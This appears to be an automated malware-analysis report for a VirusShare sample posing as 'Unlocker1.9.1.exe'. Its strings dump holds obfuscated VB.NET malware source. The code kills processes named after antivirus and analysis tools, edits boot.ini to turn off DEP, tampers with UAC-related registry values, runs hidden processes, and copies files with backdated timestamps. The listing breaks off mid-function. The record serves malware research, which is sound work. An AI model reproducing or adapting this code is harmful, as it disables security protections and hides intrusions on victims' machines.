{
    "docinfo": {},
    "filename": "VirusShare_0f53f426381b2a158a4e5ed825eece73",
    "filesize": 30720,
    "filetype": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
    "hashes": {
        "md5": "0f53f426381b2a158a4e5ed825eece73",
        "sha1": "c207343febb80151b851a685bb7f8a478b685f3d",
        "sha256": "b060e4f0da7a3f1839e1c73d0757ba217527e0be51a4fc510b238ce03d74a259"
    },
    "peinfo": {
        "behavior": [
            "Xor"
        ],
        "breakpoint": [],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "mscoree.dll": [
                    {
                        "function": "_CorExeMain",
                        "offset": 4202496
                    }
                ]
            },
            "relocations": {
                "Size": 12,
                "VirtualAddress": 49152,
                "count": 1,
                "details": {
                    "reloc_1": 2
                }
            },
            "resources": [
                {
                    "data": "b'\\\\\\x024\\x00\\x00\\x00V\\x00S\\x00_\\x00V\\x00E\\x00R\\x00S\\x00I\\x00O\\x00N\\x00_\\x00I\\x00N\\x00F\\x00O\\x00\\x00\\x00\\x00\\x00\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\\x00\\x00\\x00'",
                    "executable": false,
                    "language": "LANG_NEUTRAL",
                    "name": "RT_VERSION",
                    "offset": 41048,
                    "size": 604,
                    "sublanguage": "SUBLANG_NEUTRAL"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 36702,
        "features": {
            "antidbg": [],
            "antivm": {},
            "crypto": [],
            "mutex": [],
            "packer": [
                "Microsoft_Visual_Studio_NET",
                "Microsoft_Visual_C_v70_Basic_NET_additional",
                "Microsoft_Visual_C_Basic_NET",
                "Microsoft_Visual_Studio_NET_additional",
                "Microsoft_Visual_C_v70_Basic_NET",
                "NET_executable_",
                "NET_executable"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "metadata": {
            "Assembly Version": "0.0.0.0",
            "FileDescription": " ",
            "FileVersion": "0.0.0.0",
            "InternalName": "Unlocker1.9.1.exe",
            "LegalCopyright": " ",
            "OriginalFilename": "Unlocker1.9.1.exe",
            "ProductVersion": "0.0.0.0"
        },
        "sections": {
            "count": 3,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'@\\x8f\\x00\\x00\\x00\\x00\\x00\\x00H\\x00\\x00\\x00\\x02\\x",
                    "entropy": 6.0691432818502085,
                    "executable": true,
                    "hash": {
                        "md5": "1a2140efeff0677ab0c7475f8f2dd3fd",
                        "sha1": "e1b487adcb39247ad82477d93b30197376649d67",
                        "sha256": "afd590d05f49260409562c3b644293c13efda59a60bc8da91bb490302e148ad4"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 28672,
                    "virtual_address": 8192,
                    "virtual_size": 28516
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 2.242377703912061,
                    "executable": false,
                    "hash": {
                        "md5": "6cc8c84dbf027d156b4466da42207362",
                        "sha1": "714da7f0809cec3e9ac598919a63100ec0ca57a5",
                        "sha256": "6e9308c9e6fa0a572b4c282103698d737067131ce07c1591d8cfea09bcd9962d"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 1024,
                    "virtual_address": 40960,
                    "virtual_size": 696
                },
                {
                    "characteristics": 1107296320,
                    "data": "b'\\x00\\x80\\x00\\x00\\x0c\\x00\\x00\\x00`?\\x00\\x00\\x00\\x",
                    "entropy": 0.08153941234324169,
                    "executable": false,
                    "hash": {
                        "md5": "b2ecdd4812daaf1edd04338264731ffd",
                        "sha1": "da63aa96cdf6319d14a0118aa83b588e79f96fe5",
                        "sha256": "ecc924c0977878cce4d2d08af89c5ac64bac8b07457d977f7935c25644e51f08"
                    },
                    "section_name": ".reloc",
                    "size_of_raw_data": 512,
                    "virtual_address": 49152,
                    "virtual_size": 12
                }
            ]
        },
        "timestamp": "2011-10-29 04:45:11"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            ".text",
            "`.rsrc",
            "@.reloc",
            "Imports System",
            "Imports System.Text",
            "Imports System.Windows.Forms",
            "Imports Microsoft.VisualBasic",
            "Imports System.IO",
            "Imports System.Runtime.InteropServices",
            "Imports System.Diagnostics",
            "' TccafRKRvIIXbeWuKDmUXrUYmwSfSFgCBdLcOSrSdXpmKfEvsE",
            "Module JFnBabCLXzTxWoOoztMu",
            "\t' VjFsCaUxzgBGOEjssrwTahMYYorumLaTDknIkoDzivVVwFRtNs",
            "    Dim RiIitnGpMvHNJUlzIJSqlOQwDWeUzuvtyjqxOpoFuwoOqVTCpL As String = \"JFnBabCLXzTxWoOoztMuSCMSOaqGNPYvqUWDJckZ\"",
            "\t' BrGQyyllNViKdJhyLywqJGcMXdZkCDYZjHnRgNUmukQLMKPBtB",
            "    Public Sub eGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFToqzJEh()",
            "\t\tIf RiIitnGpMvHNJUlzIJSqlOQwDWeUzuvtyjqxOpoFuwoOqVTCpL.Length = 0 Then RiIitnGpMvHNJUlzIJSqlOQwDWeUzuvtyjqxOpoFuwoOqVTCpL = DateTime.Now.ToString",
            "    End Sub",
            "\t' wFRtNsRiIitnGpMvHNJUlzIJSqlOQwDWeUzuvtyjqxOpoFuwoO",
            "\tPublic Sub Main()",
            "\t\tCall SCMSOaqGNPYvqUWDJckZ()",
            "\tEnd Sub",
            "\tSub SCMSOaqGNPYvqUWDJckZ()",
            "\t\tCall eGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFToqzJEh()\t' Setup",
            "\t\t' Mutex Create",
            "       Dim MKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFT As System.Threading.Mutex = New System.Threading.Mutex(False, RiIitnGpMvHNJUlzIJSqlOQwDWeUzuvtyjqxOpoFuwoOqVTCpL)",
            "        If Not MKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFT.WaitOne(5 * 1000, False) Then",
            "\t\t\tCall MKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFT.ReleaseMutex()",
            "\t\t\tExit Sub",
            "        End If",
            "        Call oFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXdZkCDYZjHnRgN.UmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP() \t'Antis",
            "\t\t' *** Main Function Begin",
            "\t\tMsgBox(\"HI\")",
            "\t\t' *** Main Function End",
            "\t\tCall MKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsPntpBFT.ReleaseMutex()\t' Mutex Release",
            "\t\tExit Sub",
            "    End Sub",
            "\t' === END\tMAIN =========",
            "\t#Region \"oFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXdZkCDYZjHnRgN_BEGIN\"",
            "\tPublic Class oFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXdZkCDYZjHnRgN",
            "\t\tPublic Shared Function yjqxOpoFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXdZkCDYZ() As Boolean",
            "\t\t\tTry",
            "\t\t\t\tIf System.Environment.GetEnvironmentVariable(\"ProgramW6432\").Length > 0 Then ",
            "\t\t\t\t\tReturn True",
            "\t\t\t\tElse ",
            "\t\t\t\t\tReturn False",
            "\t\t\t\tEnd If\t\t\t\t",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function jHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQ(ByVal NHZWsPntpBFToqzJEhxQkExnTccafRKRvIIXbeWuKDmUXrUYmw As String, Optional ByVal SfSFgCBdLcOSrSdXpmKfEvsEVjFsCaUxzgBGOEjssrwTahMYYo As String = \"\", Optional ByVal rumLaTDknIkoDzivVVwFRtNsRiIitnGpMvHNJUlzIJSqlOQwDW As Boolean = True, Optional ByVal eUzuvtyjqxOpoFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXd As Integer = 0 ) As Boolean",
            "\t\t\tDim ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN As System.Diagnostics.Process = New System.Diagnostics.Process",
            "\t\t\tDim ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.FileName = NHZWsPntpBFToqzJEhxQkExnTccafRKRvIIXbeWuKDmUXrUYmw",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.Arguments = SfSFgCBdLcOSrSdXpmKfEvsEVjFsCaUxzgBGOEjssrwTahMYYo",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.CreateNoWindow = True",
            "\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.UseShellExecute = True",
            "\t\t\tIf rumLaTDknIkoDzivVVwFRtNsRiIitnGpMvHNJUlzIJSqlOQwDW Then",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden",
            "\t\t\tElse",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal",
            "\t\t\tEnd If",
            "\t\t\tTry",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.StartInfo = ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNSI",
            "\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.Start()",
            "\t\t\t\tIf eUzuvtyjqxOpoFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXd = 0 Then",
            "\t\t\t\t'",
            "\t\t\t\tElse If eUzuvtyjqxOpoFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXd = -1 Then",
            "\t\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.WaitForExit()",
            "\t\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.Close()",
            "\t\t\t\tElse",
            "\t\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.WaitForExit(eUzuvtyjqxOpoFuwoOqVTCpLBrGQyyllNViKdJhyLywqJGcMXd)",
            "\t\t\t\t\tZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyN.Close()",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function dtwzrQtYIEsNEuISBBoaCYkygxjnOCztLJfBZfbnqFbclvqUjC() As Boolean",
            "\t\t\tIf WpjZFOPNSDvDhutKNQIhvoZHJdGLYjERFqSonPwOzEeFQKcZvR() Then Return False",
            "\t\t\tDim qiepHWrfoMHkmTmsBpVefdiGMTxLKaegYxNFpXZtWbolUhHHir As String = Environment.SystemDirectory(0) & \":\\boot.ini\"",
            "\t\t\tTry",
            "\t\t\t\tDim pSlRoHgHSMeOkUfkhsKYghqPKmoVbuDsYTUSXIPWmONdTVNmPt As New System.IO.FileInfo(qiepHWrfoMHkmTmsBpVefdiGMTxLKaegYxNFpXZtWbolUhHHir)",
            "\t\t\t\tIf pSlRoHgHSMeOkUfkhsKYghqPKmoVbuDsYTUSXIPWmONdTVNmPt.Exists Then",
            "\t\t\t\t\tpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDsYTUSXIPWmONdTVNmPt.Attributes = System.IO.FileAttributes.Normal",
            "\t\t\t\t\tDim CvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQTLjyrbJMgJNbY As String = System.IO.File.ReadAllText(pSlRoHgHSMeOkUfkhsKYghqPKmoVbuDsYTUSXIPWmONdTVNmPt.FullName)",
            "\t\t\t\t\tCvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQTLjyrbJMgJNbY = CvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQTLjyrbJMgJNbY.Replace(\"optin\", \"AlwaysOff\")",
            "\t\t\t\t\tDim OZcrNOYhcGWoJbWMrzByEpipUggvzDtTibLsvQswLVqEqdEaZC As System.IO.StreamWriter = New System.IO.StreamWriter(qiepHWrfoMHkmTmsBpVefdiGMTxLKaegYxNFpXZtWbolUhHHir)",
            "\t\t\t\t\tOZcrNOYhcGWoJbWMrzByEpipUggvzDtTibLsvQswLVqEqdEaZC.Write(CvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQTLjyrbJMgJNbY)",
            "\t\t\t\t\tOZcrNOYhcGWoJbWMrzByEpipUggvzDtTibLsvQswLVqEqdEaZC.Close()",
            "\t\t\t\t\tpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDsYTUSXIPWmONdTVNmPt.Attributes = System.IO.FileAttributes.System Or System.IO.FileAttributes.Hidden Or System.IO.FileAttributes.ReadOnly",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function qdEaZCjBmqQqCvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQT(Byval LjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs As System.IO.FileSystemInfo) As Boolean",
            "\t\t\tTry",
            "\t\t\t\tIf LjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs.Exists Then",
            "\t\t\t\t\t'UmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP(New String(){LjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs",
            "\t\t\t\t\tIf LjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs.GetType().ToString().Contains(\"FileInfo\") Then",
            "\t\t\t\t\t\tUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP(New String(){LjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs.Name})",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tLjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs.Attributes = System.IO.FileAttributes.Normal",
            "\t\t\t\t\tLjyrbJMgJNbYHUttVdpSlRoHgHSMeOkUfkhsKYghqPKmoVbuDs.Delete()",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function UmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP(ByVal ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNrocessNames As System.Collections.ArrayList, Optional Byval SUdBvZbIOhpeKGGFJuBJZzyPFIzYCgeMBVLCQaJJvwXgsUoTrK As Boolean = True)  As Boolean",
            "\t\t\tReturn UmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP(Ctype(ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNrocessNames.ToArray(GetType(String)), String()), SUdBvZbIOhpeKGGFJuBJZzyPFIzYCgeMBVLCQaJJvwXgsUoTrK)",
            "\t\tEnd Function",
            "\t\tPublic Shared Function UmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNuMxCbQNHZWsP(Optional ByVal ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNrocessNames As String() = Nothing, Optional Byval SUdBvZbIOhpeKGGFJuBJZzyPFIzYCgeMBVLCQaJJvwXgsUoTrK As Boolean = True)  As Boolean",
            "\t\t\tDim gcRlcTgqZZNyawJXFWIMmaXRjgEZxEzMPdyBKUPsIauOIxdmml = System.Diagnostics.Process.GetCurrentProcess().Id",
            "\t\t\tDim qbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoiBxUpOHDOfuQD As New System.Collections.ArrayList",
            "\t\t\tDim NkfJLqLRZOtDECHekrWjiyDFwWkdOvxSuzNKsGffHPcEYDbsTt As String = \"werfault,360,beat,dw20,dwwin,kav,malware,ntvdm,pcts,QQPC,Sbie,spybot,wireshark,dwwin\"",
            "\t\t\tIf NkfJLqLRZOtDECHekrWjiyDFwWkdOvxSuzNKsGffHPcEYDbsTt.Length > 0 Then",
            "\t\t\t\tqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoiBxUpOHDOfuQD.AddRange(Split(NkfJLqLRZOtDECHekrWjiyDFwWkdOvxSuzNKsGffHPcEYDbsTt, \",\"))",
            "\t\t\tEnd If",
            "\t\t\tIf ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNrocessNames isNot Nothing Then qbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoiBxUpOHDOfuQD.AddRange(ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNrocessNames)",
            "\t\t\t' BVLCQaJJvwXgsUoTrKVKHBTQnXhnjvMNiktRybrYexGuaWWVaL",
            "\t\t\tDim ELpQCSVYQoSwgcRlcTgqZZNyawJXFWIMmaXRjgEZxEzMPdyBKU() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses()",
            "\t\t\tFor Each PsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi As System.Diagnostics.Process In ELpQCSVYQoSwgcRlcTgqZZNyawJXFWIMmaXRjgEZxEzMPdyBKU",
            "\t\t\t\tIf PsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi.Id = gcRlcTgqZZNyawJXFWIMmaXRjgEZxEzMPdyBKUPsIauOIxdmml Then Continue For\t' aWWVaLELpQCSVYQoSwgcRlcTgqZZNyawJXFWIMmaXRjgEZxEzM",
            "\t\t\t\t",
            "\t\t\t\t' PdyBKUPsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVm",
            "\t\t\t\tFor Each RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL As String In qbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoiBxUpOHDOfuQD",
            "\t\t\t\t\tRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL = System.IO.Path.GetFileNameWithoutExtension(RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL)",
            "\t\t\t\t\tIf RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL.Length = 0 Then Continue For",
            "\t\t\t\t\tDim jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO As Boolean = false",
            "\t\t\t\t\tIf RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL.Length >= 3 Then",
            "\t\t\t\t\t\tIf PsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi.ProcessName().ToLower.StartsWith(RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL.ToLower) Then jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO = True",
            "\t\t\t\t\tElse",
            "\t\t\t\t\t\tIf PsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi.ProcessName().ToLower = RVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpOdWGoqL.ToLower Then jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO = True",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tIf SUdBvZbIOhpeKGGFJuBJZzyPFIzYCgeMBVLCQaJJvwXgsUoTrK And jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO Then",
            "\t\t\t\t\t\tDim PUserName As String = \"\"",
            "\t\t\t\t\t\tPUserName = pYauXbpzViVIjGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvu(PsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi) ",
            "\t\t\t\t\t\tIf PUserName <> \"\"",
            "\t\t\t\t\t\t\tIf PUserName.ToLower.StartsWith(\"system\") Then jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO = False",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\tIf jGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvuzWdkPcbruxpO Then ",
            "\t\t\t\t\t\t\tPsIauOIxdmmlqbUbGTSilogFUNwfhCejwHcpdPqNMnVmYcDdoi.Kill()",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tNext",
            "\t\t\tNext",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function pYauXbpzViVIjGEgOfRVvVgaspNiHzvHYmIvGdYCDjEJRHmvvu(ByVal Process As System.Diagnostics.Process) As String",
            "\t\t\tTry",
            "\t\t\t\tDim sq As New System.Management.ObjectQuery(\"Select * from Win32_Process Where ProcessID = '\" & Process.Id & \"'\")",
            "\t\t\t\tDim searcher As New System.Management.ManagementObjectSearcher(sq)",
            "\t\t\t\tIf searcher.Get.Count = 0 Then Return \"\"",
            "\t\t\t\tFor Each oReturn As System.Management.ManagementObject In searcher.Get",
            "\t\t\t\t\tDim o As String() = New String(1) {}",
            "\t\t\t\t\toReturn.InvokeMethod(\"GetOwner\", DirectCast(o, Object()))",
            "\t\t\t\t\tReturn o(0)",
            "\t\t\t\tNext",
            "\t        Catch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\tEnd Try",
            "\t\t\tReturn \"\"",
            "\t\tEnd Function",
            "\t\tPublic Shared Function RHmvvuzWdkPcbruxpOdWGoqLnsGDlyYYzIVwQvUlMlxrJsPyKQ(ByVal MXoDLMWtoSTzHZhXDxywCntBSsrIxBrRtZXFtOEuJTCCooQYlN As String, ByVal TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH As String) As Boolean",
            "\t\t\tIf MXoDLMWtoSTzHZhXDxywCntBSsrIxBrRtZXFtOEuJTCCooQYlN.ToLower = TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH.ToLower Then Return False",
            "\t\t\tIf MXoDLMWtoSTzHZhXDxywCntBSsrIxBrRtZXFtOEuJTCCooQYlN.Length = 0 Or TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH.Length = 0 Then Return False",
            "\t\t\tDim bbCLXzTyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBD, uUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc As System.IO.FileInfo",
            "\t\t\tTry",
            "\t\t\t\tbbCLXzTyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBD = New System.IO.FileInfo(MXoDLMWtoSTzHZhXDxywCntBSsrIxBrRtZXFtOEuJTCCooQYlN)",
            "\t\t\t\tuUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc = New System.IO.FileInfo(TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH)",
            "\t\t\t\tIf Not uUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.Directory.Exists Then uUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.Directory.Create()",
            "\t\t\t\tIf uUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.Exists Then",
            "\t\t\t\t\tCall qdEaZCjBmqQqCvOLhEcUQctIdRaxsWYFZemcIRRQUryGkwwMQT(uUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc)",
            "\t\t\t\tEnd If",
            "\t\t\t\tbbCLXzTyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBD.CopyTo(TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH, True)",
            "\t\t\t\tuUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc = New System.IO.FileInfo(TyWoBomgyvSCMSOarsOPYvdHWDJckaGBCzFpipUugwBDuUwbMH)",
            "\t\t\t\tuUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.CreationTimeUtc\t\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\t\tuUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.LastAccessTimeUtc\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\t\tuUwbMHvQHxLWFErdFbnCjBmqRFDwPMiFdifqtJefoytXmGZsnc.LastWriteTimeUtc\t\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function WpjZFOPNSDvDhutKNQIhvoZHJdGLYjERFqSonPwOzEeFQKcZvR() As Boolean",
            "\t\t\tDim eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV As Microsoft.Win32.RegistryKey",
            "\t\t\tDim eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue As String",
            "\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\", True)",
            "\t\t\tTry",
            "\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.GetValue(\"EnableLUA\")",
            "\t\t\t\tIf eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue = \"0\" or eNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXVValue is Nothing Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\teNPjMRebKXwwYgsVoUsKkKVPhRnXiokvNbjkuSNqrYfxGvbWXV.SetValue(\"EnableUninstallerDetection\", 0)",
            "\t\t\t\t\t\tReturn False",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t\tReturn True",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tElse",
            "\t\t\t\t\tReturn True",
            "\t\t\t\tEnd If",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\t'MsgBox(ex.Message)",
            "\t\t\t\tReturn True",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function WnZdDroiBxVqPVRcguQSblfJZrMfZPuEEDHslsXjjyDGxWleOv(ByVal ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath As String) As String",
            "\t\t\tIf ZkCDYZjHnRgNUmukQLMKPBtBeGqHLOFeHmWSHbRIWgPPCoPlyNath.Length = 0 Then Return \"\"",
            "\t\t\tIf WpjZFOPNSDvDhutKNQIhvoZHJdGLYjERFqSonPwOzEeFQKcZvR Then",
